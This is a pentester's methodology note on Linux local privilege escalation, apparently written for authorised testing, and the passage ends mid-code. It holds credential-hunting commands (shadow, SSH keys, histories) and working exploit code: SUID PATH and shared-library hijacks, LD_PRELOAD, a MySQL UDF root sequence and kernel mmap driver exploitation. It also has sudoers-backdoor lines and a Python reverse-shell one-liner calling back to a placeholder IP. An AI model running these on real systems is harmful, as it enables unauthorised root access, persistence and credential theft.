# Linux - Local Privilege Escalation

The following note assumes that a low privilege shell could be obtained on the
target. Some privilege techniques detailed rely on a fully TTY shell.

To leverage a shell from a Remote Code Execution (RCE) vulnerability please
refer to the `[General] Shells` note.

“The more you look, the more you see.”
― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance

### Enumeration

###### Basic enumeration

| Description | Command |
|-------------|---------|
| OS | cat /etc/*-release <br/>cat /etc/lsb-release |
| Kernel | uname -a <br/> cat /proc/version <br/> rpm -q kernel |
| Current user | id <br/>whoami |
| All users    | cat /etc/passwd |
| Current user sudo rights | sudo -l |
| Sudo configuration – Privileged command | cat /etc/sudoers |
| Super users | awk -F: '($3 == "0") {print}' /etc/passwd |
| Logged in users | who -a <br/> w <br/> finger <br/> pinky <br/> users |
| Logged in history from /var/log/lastlog | lastlog <br/> lastlog PIPE grep -v "Never" |
| Users hashes – Privileged command | cat /etc/shadow <br/> (AIX Linux) cat /etc/security/passwd	|

###### Writable directories

Being able to write files on the system is needed for scripting the enumeration
process and exploiting kernel vulnerabilities.

The following directories are usually writable to all:

```bash
/dev/shm
/tmp
```

To find directories the current user can write into:

```bash
find / -perm -2 -type d 2>/dev/null
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
```

###### Enumeration scripts

Most of the enumeration process detailed below can be automated using scripts.
To upload the scripts on the target, please refer to the `[General] File
transfer` note.

Personal preference:
  1. `linux-smart-enumeration.sh` + `LinEnum.sh` + `linux-exploit-suggester.sh`
  (with kernel and packages checks, run off target)
  2. `linux-exploit-suggester-2.pl` + `linux-soft-exploit-suggester`

*Recommended scripts*

The `LinEnum.sh` and `linux-smart-enumeration` are maintained scripts that
enumerate the system configuration using more than 65 checks (OS & kernel
information, home directories, sudo acces, SUID/GUID files, configuration
files, etc.).

```bash
-t	Thorough tests (notably SUID/GUID files)
-r	Report name
[-k	Keyword to grep in enumerated configuration files]

LinEnum.sh -t -k 'pass' -r <PATH/FILENAME>

lse -l2
```

The `linux-exploit-suggester.sh` and `linux-exploit-suggester-2.pl` (evolution
of `linux-exploit-suggester.pl`) are maintained scripts that check for publicly
known vulnerabilities and exploits in the Linux kernel and installed packages of
the target.

The `linux-exploit-suggester.sh` script require `Bash` to be in version 4.0 or
higher. The script can be used off the targeted box, by gathering the OS,
Kernel and installed packages versions.

```bash
(target box) $ uname -a
# Get packages list - Refer to the [General] File transfer note to transfer the file
[Debian / Ubuntu] (target box) $ dpkg -l > <PACKAGE_LIST>
[RedHat / CentOS  / Fedora ] (target box) $ rpm -qa > <PACKAGE_LIST>

linux-exploit-suggester.sh --full --uname "<UNAME>" --pkglist-file <DPKGOUT_FILE>
```

Or directly on the targeted box:

```bash
linux-exploit-suggester.sh --full

linux-exploit-suggester.pl
```

The `linux-soft-exploit-suggester` finds exploits for vulnerable packages in
a Linux system. It focuses on software packages instead of Kernel
vulnerabilities. It uses the `exploit-db` database to evaluate the security of
packages and search for exploits, so an export of available exploits must be
provided to the script:

```bash
# Generate the exploit-db CSV list locally
python linux-soft-exploit-suggester.py --update

# Get packages list - Refer to the [General] File transfer note to transfer the file
[Debian / Ubuntu] (target box) $ dpkg -l > <PACKAGE_LIST>
[RedHat / CentOS / Fedora ] (target box) $ rpm -qa > <PACKAGE_LIST>

python linux-soft-exploit-suggester.py --file <PACKAGE_LIST> --db files_exploits.csv
```

*Worth mentioning scripts*

The `BeRoot.py` script enumerates common misconfigurations, with a bit more
advanced checks (GTFOBins, NFS Root Squashing, etc.) details than `LinEnum.sh`.
It additionally, embeds `linux-exploit-suggester` to give an overview of
potential CVE that affect the kernel.

However, `BeRoot.py` requires `Python` to be installed on the target and is not
practical to use.

*Outdated scripts*

The `Linuxprivchecker.py` script enumerates the system configuration and runs
 privilege escalation checks to recommend kernel privilege escalation exploits.
**The linux-exploit-suggester.py is not maintained anymore.**

```bash
python Linuxprivchecker.py
```

### File systems

###### Mounted partitions and drives

The following commands can be used to display all mounted file systems:

```bash
# Human readable
df -aTh

# Both equivalent, provides the mount options of the file systems
mount
cat /proc/mounts
```

###### Clear text passwords in files

Search for clear text passwords stored in files. Use the keyword 'password'
first and broaden the search if needed by searching for 'pass':

```bash
# Restrict the search to configuration files
find / -name "*.conf" -print0 | xargs -0 grep -Hi "password"
find / -name "*.conf" -print0 | xargs -0 grep -Hi "pass"

# All files
find / -type f -print0 | xargs -0 grep -Hi "pass"
find / -type f -print0 | xargs -0 grep -Hi "password"

# PHP MySQL connect for Linux Apache MySQL PHP (LAMP) server
find / -type f -name "*.php" -print0 | xargs -0 grep -Hi "mysql_connect"
```

###### Users home directories content

The users home directories may contain sensible information such as config files
or history files.
The following commands can be used to display the content of the users home
directories:

```bash
# Home
ls -lahR /root
ls -lahR /home
find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
tree -pugfai /home

# Histories
find /home -name "*history*" -print -exec cat {} 2>/dev/null \;
cat ~/.bash_history
cat ~/.sh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

###### SSH private-keys and configurations

```bash
# id_rsa, id_dsa, authorized_keys, etc.
ls -lah ~/.ssh/
find /home -name "*id_rsa*" -print -exec cat {} 2>/dev/null \;
find /home -name "*id_dsa*" -print -exec cat {} 2>/dev/null \;

# ssh_config, sshd_config, ssh_host_rsa_key, ssh_host_dsa_key, etc.
ls -lah /etc/ssh/
```

###### Services configuration

The following commands can be used to list the configuration files present on
the system.
The files in the `/etc` folder are more likely to be active configurations and
should be reviewed first.

```bash
find /etc -name '*.conf' -exec ls -lah {} 2>/dev/null \;
find / -name '*.conf' -exec ls -lah {} 2>/dev/null \;
```

###### Hidden files

To list the hidden files present on the system:

```bash
find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -lah {} \; 2>/dev/null
```

###### World-writeable and "nobody" files

The following commands can be used to list the files that are world writeable or
that do not have a owner:

```bash
# All world-writable files excluding /proc and /sys
find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -lah {} \; 2>/dev/null

# No owner files
find / -xdev \( -nouser -o -nogroup \) -print
```

###### Others files of potential interest

The following files and directories may contain interesting information:

```bash
/var/mail/
/var/www/
/var/log/
/etc/httpd/logs/

# Files owned by the compromised user
find / -user "<USERNAME>" -name "*" 2>/dev/null

# Files readable by the current user
find / -readable -type f 2>/dev/null

# Files accessible to a specific group the compromised user is a member of
find / -group "<GROUP_NAME>" -name "*" -exec ls -ld {} \; 2>/dev/null

# Files added / modified between the specified dates (YYYY-MM-DD). Can be used to detect custom content added on the box after installation.
find / ! -path "/proc/*" ! -path "/sys/*" -newermt "<START-DATE>" ! -newermt '<END-DATE>' -type f 2>/dev/null
find / -newermt "<START-DATE>" ! -newermt '<END-DATE>' -type f 2>/dev/null
find / -newermt "<START-DATE>" ! -newermt '<END-DATE>' 2>/dev/null
find / -newermt "<START-DATE>" ! -newermt '<END-DATE>' -exec ls -lah {} \; 2>/dev/null
```

### Privileges escalation through SUID / SGID binaries

`SUID` / `SGID` binaries are executed, respectively, with the privileges of the
user or group owner of the file. A number of misconfigurations of `SUID` /
`SGID` binaries can be leveraged for privilege escalation.

###### Find SUID/GUID files and directories

The `find` utility can be used to list the `SUID` / `GUID` binaries present on
the local system:

```bash
# Files with SUID set.
find / -user root -perm -4000 -ls 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -type f -user root -perm -4000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

# Files with SGID set.
find / -user root -perm -2000 -ls 2>/dev/null
find / -type f -user root -perm -2000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

# Files with both the SUID and SGID set.
find / -user root -perm -6000 -ls 2>/dev/null
find / -type f -user root -perm -6000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
```

Look for `GTFOBins` or any unusual binaries in the list of `SUID` / `GUID`
files enumerated.

###### "GTFOBins"

The `GTFOBins` are binaries that can be used to bypass local security
restrictions and notably escape to execute commands through a shell.

The following binaries can be exploited to elevate privileges on the
system if run with the `SUID` / `SGID` bit set:

| | | | | | | | | | |
|-|-|-|-|-|-|-|-|-|-|
| aria2c | ash | awk | base64 | bash | busybox | cat | chmod | chown | cp |
| csh | curl | cut | dash | date | dd | diff | dmsetup | docker | ed |
| emacs | env | expand | expect | find | flock | fmt | fold | gdb | git |
| grep | head | ionice | jjs | jq | jrunscript | ksh | ld.so | less | lua |
| make | more | mv | mysql | nano | nc | nice | nl | nmap | node |
| od | perl | pg | php | pic | pico | python | rlwrap | rpm | rpmquery |
| rsync | run-parts | scp | sed | setarch | shuf | socat | sort | sqlite3 | start-stop-daemon |
| stdbuf | strace | tail | tar | taskset | tclsh | tee | telnet | tftp | time |
| timeout | ul | unexpand | uniq | unshare | vi | vim | watch | watch | wget |
| xargs | xxd | zip | zsh |

For a more comprehensive / updated list of `GTFOBins`, and their respective
privileges escalation sequences, please refer to:

```
https://gtfobins.github.io/
(https://github.com/GTFOBins/GTFOBins.github.io)
```

###### Relative binary call and PATH exploit

If a binary with the `SUID` / `SGID` bit set runs another binary with out
specifying its full path, it can be leveraged to escalate privileges on the
system. The vulnerability arise because the Linux operating system relies on the
current user `PATH` environment variable to find the binary called and not the
path of the owner of the `SUID` / `SGID` binary.

Note that this attack primitive is not applicable to binaries executed through
`sudo`, if the `secure_path` value is set in the `sudoers` file. If set, the
`PATH` defined in the `PATH` value will indeed be used instead of the `PATH`
environment variable for the commands executed through `sudo`.

To detect that a `SUID` / `SGID` binary is calling others binaries with out
specifying their full path, the Linux `strings` utility can be used:

```bash
strings <SUID_BINARY>

# Example of a vulnerable call for the "cp" utility.
cp /etc/shadow /etc/shadow.bak
```

The exploit sequence is as follow:

  1. Include a writable by the current user folder in the `PATH` environment
     variable. Do not use a folder writable by all users as it could be used
     against the current  user and would lower the system security level.
     `export PATH=/home/<USERNAME>:$PATH`

  2. Create a binary named after the binary called by the `SUID` / `SGID`
     binary in the added folder. If the arguments used for the call permit it,
     `bash` or `sh` can be used directly.
     If not, the following C code can be used to compile a binary executing
     `/bin/bash` under the privilege of the user or group owner of the `SUID` /
     `SGID` binary. Refer to the `[General] Shells` note for reverse shell
     payloads if needed.

     ```c
     #include <stdlib.h>
     #include <unistd.h>

     void main() {
       // Bash drops its privilege if the effective uid is not the same as the real uid (if the -p option is not specified for bash).
       setreuid(geteuid(), geteuid());
       setregid(getegid(), getegid());
       system("/bin/bash");
     }
     ```

  3. Execute the vulnerable `SUID` / `SGID` binary.

###### Exploit through dynamic / shared library

The search order for the Linux dynamic linker is as follow, as stated in the
[`ld man page`](https://linux.die.net/man/1/ld):
  1. Any directories specified by the `-rpath-link` option (only effective at
     link time).

  2. Any directories specified by the `-rpath` option (only effective at
     runtime). This option sets the `RPATH` / `DT_RPATH ` or `RUNPATH` /
     `DT_RUNPATH ` attribute of a binary.

  3. From the content of the `LD_RUN_PATH` environment variable (if neither
    `-rpath-link` nor `-rpath` options were used at compile time).

  4. From the content of the `LD_LIBRARY_PATH` environment variable.

  5. The default directories, normally `/lib` and `/usr/lib`.

  6. The list of directories configured in the `/etc/ld.so.conf` file.

     The directories searched by the dynamic linker within the
     `/etc/ld.so.conf` configuration can be listed (in order) using the
     `ldconfig` utility:

     ```bash
     ldconfig -v 2>/dev/null | grep -v ^$'\t'
     ```

Note that for `SUID` / `SGID` binaries, the `LD_RUN_PATH` and `LD_LIBRARY_PATH`
environment variables cannot be leveraged for privilege escalation, as the
environment variables of the owner of the file are used (instead of the
environment variable of the user executing the binary).

*Library exploit code example.*

The following exploit code can be used to compile a shared library executing
`/bin/bash` as the user or group owner of the `SUID` / `SGID` binary
(retrieved with `geteuid()`) upon being loaded:

```c
// Compile using:
// gcc -o <OUTPUT_LIBRARY>.so -shared -fPIC <CODE_FILE>
#include <stdlib.h>
#include <unistd.h>

static void library_main() __attribute__((constructor));

void library_main() {
  setreuid(geteuid(), geteuid());
  setregid(getegid(), getegid());
  system("/bin/bash");
}
```

*SUID / SGID binary compiled with the RPATH / RUNPATH option.*

As described in the dynamic library search order above, any shared library
stored under the directory specified (at compile time) by the `-rpath` option
will be loaded over libraries from any other locations. If an user has the
rights to write files in a folder specified in the `RPATH` / `RUNPATH` of a
`SUID` / `SGID` binary, the binary could be leveraged for privilege escalation.

The `objdump` utility, among others, can be used to determine if a given binary
has been compiled with the `RPATH` option (`-rpath='<DIRECTORY_PATH>`):

```
objdump -x <SUID_BINARY> | grep -i "RPATH\|RUNPATH"
```

Then the aforementioned exploit code, or the
[following code](https://www.voidsecurity.in/2012/10/exploit-exercise-rpath-vulnerability.html)
to exploit more specifically the `libc.so` can be used to execute a shell with
the privileges of the `SUID` / `SGID` binary owner:

```c
// Compile using:
// gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic  libc.c -o libc.so.6
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
  char *file = SHELL;
  char *argv[] = {SHELL,0};
  setresuid(geteuid(),geteuid(), geteuid());
  execve(file,argv,0);
}
```

*Dynamic / shared library link order hijacking.*

If an user has the right to create or modify files in a directory present in
the dynamic linker search order, the loading of an arbitrary dynamic / shared
library by an `SUID` / `SGID` binary (or a binary executed with higher
privileges through `sudo`) could be induced.

The following scenarios may arise:
  - rights to overwrite a legitimate library loaded by the targeted
    `SUID` / `SGID` binary. May impact other programs loading the library and
    induce system instability.
  - rights to create a file in a directory taking precedence in the search
    order over the directory containing the legitimate library. May also impact
    other programs loading the library and induce system instability.
  - rights to create a file in a directory in the search order and the targeted
    `SUID` / `SGID` binary attempts to load a non-existing library.

The `ldd` utility can be used to enumerate the shared libraries imported by a
binary, while the `strace` utility can be used as a complement to trace the
eventual libraries loaded at runtime with calls to `dlopen`.

The aforementioned exploit code can, for example, be used to execute a shell
under the effective user id of root through a `SUID` / `SGID` binary. The
library should simply be placed in the targeted directory or as a replacement
of an existing library.

### Privilege escalation through sudo

###### "GTFOBins"

Similarly to `SUID` / `GUID` binaries, any `GTFOBins` program that allows
arbitrary commands execution can be leveraged for privilege escalation if
defined to be executable with higher privileges in a `sudo` entry.

`GTFOBins` binaries are referenced on the
[`gtfobins.github.io`](https://gtfobins.github.io/) website.

###### LD_PRELOAD

If the `LD_PRELOAD` environment variable is set to be kept in the `sudo`
configuration (`env_keep += LD_PRELOAD` set in the `/etc/sudoers` file), it may
be possible to obtain code execution under the privileges assumed through
`sudo`. The `LD_PRELOAD` environment variable can indeed be leveraged to induce
the utility executed through `sudo` (with hopefully higher privileges) to load
an arbitrary shared library (`.so`).

The following code example executes `/bin/sh` under the identity of the user
executing the binary (identified with the `effective uid`, retrieved using
`geteuid`), and can be leveraged to elevate privilege (if loaded by a binary
executed under a more privileged user through `sudo`). The `_init` special
function gets called as the library is first opened.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setuid(geteuid());
  setgid(getegid());
  system("/bin/sh");
}
```

The `sudo` configuration can be retrieved using `sudo -l` (if the current
user as the required privileges to execute `sudo`). The following example
output shows a vulnerable `sudo` configuration allowing for privilege
escalation:

```
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_reset, env_keep+=LD_PRELOAD

User user1 may run the following commands on aeae955a6e8c:
(root) NOPASSWD: /usr/bin/openssl
```

`gcc`, among other compilers, can be used to compile a shared library
leveraging the exploitation code example above to obtain a shell under the
privileges assumed through `sudo`.

```bash
# Compiles the exploitation code as a shared library.
# The "-nostartfiles" flag is needed to compile shared library making use of the "_init" function.
gcc -nostartfiles -fPIC -shared -o <LIBRARY>.o <CODE_FILE>.c

# Executes the arbitrary shared library through the targeted binary executed under sudo.
# The shared library file should be placed in a directory for which the targeted user has access.
sudo [-u <USERNAME>] LD_PRELOAD=<PATH>/<LIBRARY>.o <TARGETED_SUDO_COMMAND>
```

### Linux groups

The membership of the compromised user to one of the groups listed below may,
under certain circumstances, lead to a local elevation of privilege.

###### staff

The `staff` group allows users to add local modifications to the system
`/usr/local` directory without needing root privileges. By default, no user
belongs to this group.

Users belonging to this group can thus add and modify the binaries present in
`/usr/local/bin` and `/usr/local/sbin`. As both directories are by default the
two first entries in the `PATH` for, among others, the `root` user, the
membership to this group can be leveraged to hijack `root` binary use,
resulting in local privilege escalation.

```bash
root@x: whoami && echo $PATH
root
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

To simply hijack a binary call, an executable script with the binary name
can be placed under `/usr/local/sbin` or `/usr/local/bin`. In order to maintain
the system operability and attain a certain level of covertness, the legitimate
binary can be called at the end of the script.

For example, the following commands can be used to hijack the specified binary
and add the compromised user to the `sudoers` whenever root makes use of the
binary:

```bash
# If needed, save the hijacked binary
cp /usr/local/sbin/<BINARY> /usr/local/sbin/.<BINARY>

echo '#!/bin/bash' > /usr/local/sbin/<BINARY>
echo '/bin/echo "<USERNAME>    ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /usr/local/sbin/<BINARY>
echo '/<FULL_PATH>/<BINARY> "$@"' >> /usr/local/sbin/<BINARY>
chmod +x /usr/local/sbin/<BINARY>
```

A reverse shell commands can be used as well, refer to the `[General] shells`
note for potential reverse shell one-liners and scripts.

The `pspy` utility can be used to monitor the local process to check if a
recurring task executed under `root` privileges (`UID=0`) could be immediately
exploited.

### Unpatched kernel and services

###### Compilers/languages installed/supported

The supported languages may be leveraged to compile exploit against the
operating system / kernel and services.

To find out which compilers / languages can be used:

```bash
# All-in-one
find / -type f \( -name "gcc" -or -name "g++" -or -name "clang" -or -name "python" -or -name "python2" -or -name "python3" -or -name "ruby" -or -name "perl" -or -name "php" \) -exec  ls -lah {} \; 2>/dev/null

# C / C++
find / -name gcc* 2>/dev/null
find / -name g++* 2>/dev/null
find / -name clang* 2>/dev/null

# Python
python --version
find / -name python* 2>/dev/null

# Ruby
ruby --version
find / -name ruby* 2>/dev/null

# Perl
perl --version
find / -name perl* 2>/dev/null

# PHP
php --version
find / -name php* 2>/dev/null
```

If no compilers are available on the system, it is recommended to compile the
exploit on a similar kernel and upload the binary to the target,  refer to
the `General - File transfer` note to do so.

Verify the transferred binary integrity using the Linux builtin `md5sum`.

###### OS and kernel versions

To retrieve the Linux operating system and kernel versions:

```bash
cat /etc/*-release
cat /etc/lsb-release
uname -a
cat /proc/version
rpm -q kernel
```

###### Installed packages and binaries

The installed programs should be reviewed for potential known vulnerabilities.
To review the installed programs on the target:

```bash
dpkg -l
dpkg -l <PACKAGE_NAME>

apt list --installed

rpm -qa

ls -lah /usr/bin
ls -lah /usr/sbin
```

###### Exploits detection tools

The enumeration scripts linux-exploit-suggester.sh can be used on or off target,
if provided with the `uname -a` output and the installed packages list
(`dpkg -l` or `rpm -qa` command output), to enumerate potential exploits for
the targeted box.

Refer to the "Enumeration - Enumeration scripts" part above for more information
and usage guides to the most well known local exploit suggester scripts.

###### File transfer

To transfer the exploit code on the target box, refer to the `General - File
transfer` note.

### Processes and services

The processes running should be reviewed for known exploits, with
a special attention given to the processes running under root privileges.
The command line arguments used to start the process should be
reviewed for sensible information. Additionally, a deeper analyze of non
standard processes should be conducted with particular attention given to
processes running as root.

###### Enumerate running processes and services

By default on Linux, all processes can be listed by unprivileged and non owner
users. However, the system can be hardened in order to limit processes listing
to self owned processes. This configuration is made through the mount option
`hidepid` on the `proc` file system. The following values can be defined for the
attribute:
  - `hidepid=0` (default), all world-readable `/proc/<PID>/*` files, meaning
  every process can be listed and potentially sensible information retrieved ;
  - `hidepid=1`, directories entry in the `proc` file system (`PID` folders)
  can be listed but files and subdirectories accessed may not accessed, except
  for owned processes ;
  - `hidepid=2`, As for mode 1, but in addition the `/proc/<PID>` directories
  belonging to other  users  become  invisible. This doesn't hide the fact that
  a process with a specific PID value exists (it can be learned by other means,
  for  example, by `kill -0 $PID`), but it hides a process's UID and GID,
  which could otherwise be learned by employing `stat` on a `/proc/<PID>`
  directory. If configured, this option greatly limit the information available
  and notably makes it impossible to determine if processes are started by
  privileged users.

Additionally, the mount option `gid` specifies  the  ID of a group whose
members are authorized to learn process information otherwise prohibited by
`hidepid`. In other words, users in this group behave as though the `proc`
file system was mounted with `hidepid=0`.

The current processes can be listed using the `ps` Linux utility:


# Depending on the ps utility version either a or e may be used to include processes belonging to other users
ps aux

# Includes environment variable, verbose
ps auxeww

ps aux | grep root
ps ef | grep root

# Listening services
netstat -antup
ss -twurp
```

The information retrieved by the Linux `ps` utility can also be accessed
manually directly in the process directory:
  - `/proc/<PID>/status`: provides meta-data information such as the process
  umask, running state, PID, PID of the parent process if any, and real and
  effective UIDs of the process owner.
  - `/proc/<PID>/cmdline`: contains the complete command line arguments for the
  process, unless the process is a zombie.
  - `/proc/<PID>/environ`: contains the initial environment defined when the
  process was started.

###### Process snooping

Process snooping as an unprivileged user consists in monitoring the processes,
and especially the short lived processes, being run on the system. Process
snooping draws its interest from the fact that sensible information can be
visible in the `proc` file system (such as the CLI arguments and other
information identified above) as long as a process is running and disappears
once the process comes to an halt.

While process snooping can be done through an infinite loop scanning of the
`proc` file system for creation of new PID subdirectories, a more stealthier and
resource-efficient approach is to rely on the `inotify` API to get notified
whenever files are created, modified, deleted, accessed in `/usr` (libraries),
`/tmp`, `/var` (log files), etc.

This method is implemented by the `pspy` Go tool. Pre-built statically compiled
32 and 64 bits binaries can be retrieved on GitHub.
By default, `pspy` monitors the following directories: `/usr`, `/tmp`, `/etc`,
`/home`, `/var`, and `/opt`. Additional directories can be specified using the
`-r` option.


# -p: enables printing commands to stdout
# -f: enables printing file system events to stdout
# -c: print events in different colors. Red for new processes, green for new Inotify events
# -i: interval in milliseconds between procfs scans

pspy64 -pfc -i 1000
```

###### MySQL

If a `MySQL` service is running under root privileges and `MySQL` credentials for
an user with FILE privileges are known, local privilege escalation can be
achieved.

Refer to the `File system - Clear text passwords in files` part above for
finding potential MySQL credentials present on the server. A blank password for
the root user account is worth trying as well, especially if the `MySQL`
service is only exposed locally on the server.

The `raptor_udf.c` (https://www.exploit-db.com/raw/1518) dynamic library can
be used to leverage those pre requisites to conduct a local privilege
escalation.


gcc -g -c raptor_udf.c
gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
# Do not forget to change <PATH>
mysql> insert into foo values(load_file('<PATH>/raptor_udf.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf.so';
mysql> create function do_system returns integer soname 'raptor_udf.so';
mysql> select * from mysql.func;
* +-----------+-----+---------------+----------+
* | name      | ret | dl            | type     |
* +-----------+-----+---------------+----------+
* | do_system |   2 | raptor_udf.so | function |
* +-----------+-----+---------------+----------+

# Test the privileges obtained
mysql> select do_system('id > /tmp/out; chmod 0755 /tmp/out');

# Refer to General - Shells - Binary - Linux C binary for SUID shell for the source C code for the SUID sh binary.
mysql> select do_system('chown root.root /tmp/suid; chmod 4755 /tmp/suid');

mysql> \! sh
sh$ /tmp/suid
```


### Init.d

### Cron jobs and Scheduled tasks

Look for tasks running as root from script that you can modify:

```bash
crontab -l
crontab -u <USERNAME> -l

ls -lah /var/spool/cron
ls -lahR /var/spool/cron
ls -al /etc/ | grep cron
grep -i CRON /var/log/syslog
cat /etc/cron*
cat /var/spool/cron/crontabs/root
```

### Python library hijacking

When importing a library, using `import <LIBRARY_NAME>`, the Python interpreter
will first search in the interpreted script folder for the library and then
cycle through a predefined list of libraries folders.

A Python library hijacking can be leveraged to elevate privileges on the system
whenever the current user has write access either in the Python libraries
import folders or in the directory of a Python script that can (`sudo` and
`suid`) or will (`cron`, `init.d`, etc.) be run with higher privileges.

The following commands can be used to enumerate the Python import libraries
folders and list their access rights:

```bash
python -c 'import sys; print sys.path'
python -c 'import sys; print "\n".join(sys.path)' | xargs ls -ld
```

Potentially exploitable Python scripts should be identified when conducting the
privileges escalation methodology. Additionally, the `find` Linux built-in can
be used to exhaustively list all Python scripts present on the system as well as
folders containing a Python and writable by the current user for further
investigation:

```bash
# List all Python scripts present on the system
find / -name '*.py' | grep -v -e "/usr/lib/python\|/usr/local/lib/python"

# List all folders writable by the current user that contains a Python script
find / -name '*.py' -printf "%h\0"  2>/dev/null | xargs -0 sh -c 'for p; do [ -w "$p" ] && echo "$p"; done' - | sort -u
```

In order to successfully exploit a Python library hijacking, it is recommended
to completely copy the hijacked library, only adding a payload to the existing
library code.
The following payloads can be used:

```bash
# Add current user to the suoders
/bin/echo "<USERNAME>    ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers

# Reverse shell one-liner
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

For more Python reverse shell payloads, refer to the `[General] Shells` note.

### Kernel drivers `mmap` handler exploitation

Traditionally, the standard practice is to build device drivers as kernel
modules loaded to run in the kernel (`Ring 0` on x86 CPUs). While some device
drivers can also run in user land, this approach is usually not preferred,
mainly for performance and access sharing reasons. Although not common, drivers
may also be built statically into the kernel file on disk. Devices drivers are
thus usually running under high privileges and should be considered in the
attack surface for privileges escalation.

The access and communications to the drivers are made using device files,
located in the `/dev` directory. These devices drivers files may support all of
the regular functions of normal Linux files such as `open`, `read` and `close`
operations as well as `mmap` operations, which are used to create a new mapping
in the virtual address space of the calling process. The main purpose of using
an `mmap` handler in a driver is to speed up data exchange between kernel space
and user land, by setting a memory buffer in kernel space accessible from
user land without the need of additional syscalls.

A possible issue in drivers `mmap` implementation is the lack of verification of
process supplied size allocation range. A vulnerable driver could potentially
allows a user space process to `mmap` all of the physical memory address space
of the kernel memory.

A total, or partial, mmaping of the kernel memory could be leveraged to
elevate the privileges of the calling process by modifying its `cred` struct,
which contains, among others variables, the process `uids` and `gids`:

```c
struct cred {
  kuid_t uid; /* real UID of the task */
  kgid_t gid; /* real GID of the task */
  kuid_t suid; /* saved UID of the task */
  kgid_t sgid; /* saved GID of the task */
  kuid_t euid; /* effective UID of the task */
  [...]
}
```

The exploitation process is as follow:
  1. Retrieve the current process credentials (`uids`, `gids` and
    `capabilities`).
  2. `mmap` kernel space memory using a vulnerable driver
  3. Scan the mmaped memory to find a pattern of 8 integers which matches the
     current process credentials
  4. Replace the `uids`/`gids` with a value of 0 (`root`) and call `getuid()`
     to check if the current process `uid` was modified
  5. a. if the `uid` of the current process was modified, privileges escalation
        has been achieved and a call to `/bin/sh`, for example, can be used to
        execute commands as `root`
     b. Otherwise, the previous `uids`/`gids` values are restored and the
        search, repeating from step 3, continues

Note that sometimes the whole address space of the kernel memory may not be
mapped, and the process above will fail as the current process credentials
may not be present in the mapped memory address space. In those specific cases,
and in a black box approach, a `cred` structure spray can be undertaken, by
creating a large number of child processes, each conducting the exploitation
steps above and implemented to notify the parent process in case of successful
exploitation.

For more information and a detailed explanation of the attack, refer to the
whitepaper `MWR Labs Whitepaper - Kernel Driver mmap Handler Exploitation`:

```
https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf
```

###### Enumeration of devices drivers supporting `mmap` operations

To conduct `mmap` operations on a device driver, `write` permission on the
device drive file is needed. The following command can be used to enumerate the
device drivers files the current user as `write` access to:


find /dev -perm -2 -exec ls -ld {} \; 2>/dev/null | grep -v "lrwxrwxrwx"
```

The following `C` code can then be used to conduct a `mmap` operation on the
previously enumerated device drivers files:

```c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define NUMBER_OF_STRING 12
#define MAX_STRING_SIZE 100

int main(int argc, char * const * argv) {
  printf("[+] PID: %d\n", getpid());

  char arr[NUMBER_OF_STRING][MAX_STRING_SIZE] = {
    "/dev/<DRIVER_FILE1>",
    "/dev/<DRIVER_FILE2>"
  };

  for (int i = 0; i < NUMBER_OF_STRING; i++) {

    printf("[+] Trying devices: '%s' ", arr[i]);

    int fd = open(arr[i], O_RDWR);
    if (fd < 0) {
      printf("  [-] Open failed!\n");
      continue;
    }
    printf("  [+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ
    | PROT_WRITE, MAP_SHARED, fd, 0x0);

    if (addr == MAP_FAILED) {
      perror("  [-] Failed to mmap: ");
      close(fd);
      continue;
    }

    printf("  [+] mmap OK addr: %lx\n", addr);
    int stop = getchar();

    close(fd);
  }

  return 0;
}
```

The following result demonstrates that the specific device driver supports
`mmap` operations:

```bash
# Current process PID
[+] PID: <PID>

[+] Trying devices: '/dev/<DRIVER_FILE>'
  [+] Open OK fd: x
  [+] mmap OK addr: 42424000

# Current process memory containing the mmaped memory at 42424000
cat /proc/<PID>/maps
[...]
42424000-132424000 rw-s 00000000 00:06 440
```

###### Exploitation of a vulnerable `mmap` handler device driver implementation

The following `C` code implements the exploitation process presented above and
open an `sh` interpreter in case of successful modification of the current
process `uids`/`gids`:

```c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define DRIVER "/dev/<DRIVER_FILE>"

int main(int argc, char * const * argv) {
  printf("[+] PID: %d\n", getpid());

  printf("[+] Exploiting driver: '%s' ", DRIVER);

  int fd = open(DRIVER, O_RDWR);
  if (fd < 0) {
